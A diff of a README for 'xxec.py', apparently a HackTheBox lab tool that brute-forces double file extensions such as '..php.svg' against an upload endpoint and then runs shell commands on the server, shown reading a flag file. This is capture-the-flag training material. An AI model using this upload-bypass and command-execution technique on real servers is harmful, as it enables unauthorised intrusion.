@@ -32,7 +32,9 @@ done
 ## Usage
 
 ```shell
-python3 xxec.py -H SERVER -p PORT -w extensions.svg -c 'path/to/directory/'
+python3 xxec.py -u 'http://SERVER:PORT/contact/upload.php' \
+-w extensions.svg \
+-c 'path/to/directory/'
 
 [TEST 1/36] Trying extension: ..php.svg
 [UPLOAD SUCCESS] test..php.svg -> Checking execution...
@@ -100,6 +102,6 @@ var
 Enter command to execute (or type 'exit' to stop): cat /flag_xx.txt
 [COMMAND OUTPUT]
 
-HTB{}
+HTB{FLAG-GOES-HERE}
 Enter command to execute (or type 'exit' to stop): 
 ```
